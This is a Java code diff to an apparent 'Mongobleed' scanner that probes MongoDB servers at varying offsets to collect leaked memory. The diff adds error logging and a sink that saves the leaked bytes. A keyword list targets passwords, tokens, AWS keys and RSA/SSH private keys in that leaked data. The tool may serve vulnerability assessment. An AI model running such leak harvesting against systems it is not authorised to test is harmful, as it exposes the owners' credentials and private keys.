@@ -14,8 +14,13 @@ public class MongobleedScanner {
             "password", "secret", "key", "token", "admin", "akia",
             "ssh", "private key", "begin rsa", "begin openssh"
     };
+    private static final int MAX_PROBE_ERROR_LOGS = 3;
 
     public ScanResult scan(ScanConfig config, ScanProgressListener listener) {
+        return scan(config, listener, null);
+    }
+
+    public ScanResult scan(ScanConfig config, ScanProgressListener listener, LeakSink leakSink) {
         long start = System.currentTimeMillis();
         List<LeakItem> leaks = new ArrayList<>();
         Set<String> unique = new HashSet<>();
@@ -23,7 +28,10 @@ public class MongobleedScanner {
         int totalBytes = 0;
         int probes = 0;
         boolean cancelled = false;
+        int probeErrorLogCount = 0;
+        int suppressedProbeErrors = 0;
 
+        outer:
         for (int docLen = config.minOffset; docLen <= config.maxOffset; docLen += config.step) {
             if (listener != null && listener.isStopRequested()) {
                 cancelled = true;
@@ -45,6 +53,17 @@ public class MongobleedScanner {
                         config.maxResponseBytes
                 );
             } catch (IOException e) {
+                if (listener != null && !listener.isStopRequested()) {
+                    if (probeErrorLogCount < MAX_PROBE_ERROR_LOGS) {
+                        listener.onError(
+                                "Probe failed for " + config.host + ":" + config.port + " at offset " + docLen,
+                                e
+                        );
+                        probeErrorLogCount++;
+                    } else {
+                        suppressedProbeErrors++;
+                    }
+                }
                 response = new byte[0];
             }
 
@@ -58,7 +77,21 @@ public class MongobleedScanner {
                 if (!unique.add(key)) {
                     continue;
                 }
-                leaks.add(new LeakItem(docLen, leak));
+                LeakItem leakItem;
+                if (leakSink != null) {
+                    try {
+                        leakItem = leakSink.persist(docLen, leak);
+                    } catch (IOException e) {
+                        if (listener != null) {
+                            listener.onError("Failed to persist leak output at offset " + docLen, e);
+                        }
+                        cancelled = true;
+                        break outer;
+                    }
+                } else {
+                    leakItem = new LeakItem(docLen, leak.length, FormatUtils.preview(leak, 120), -1L);
+                }
+                leaks.add(leakItem);
                 totalBytes += leak.length;
                 keywordHits.addAll(findKeywords(leak));
 
@@ -85,6 +118,13 @@ public class MongobleedScanner {
             }
         }
 
+        if (listener != null && suppressedProbeErrors > 0) {
+            listener.onError(
+                    "Suppressed " + suppressedProbeErrors + " additional probe I/O errors for this scan",
+                    null
+            );
+        }
+
         long duration = System.currentTimeMillis() - start;
         return new ScanResult(leaks, totalBytes, keywordHits, probes, duration, cancelled);
     }
@@ -105,6 +145,15 @@ public class MongobleedScanner {
 
     public interface ScanProgressListener {
         void onProgress(int offset, int maxOffset, int probes, int leaksFound, int totalBytes);
+        void onError(String message, Exception error);
         boolean isStopRequested();
+    }
+
+    public interface LeakSink {
+        LeakItem persist(int offset, byte[] leak) throws IOException;
+    }
+
+    public void cancelInFlight() {
+        MongoBleedClient.cancelOpenSockets();
     }
 }
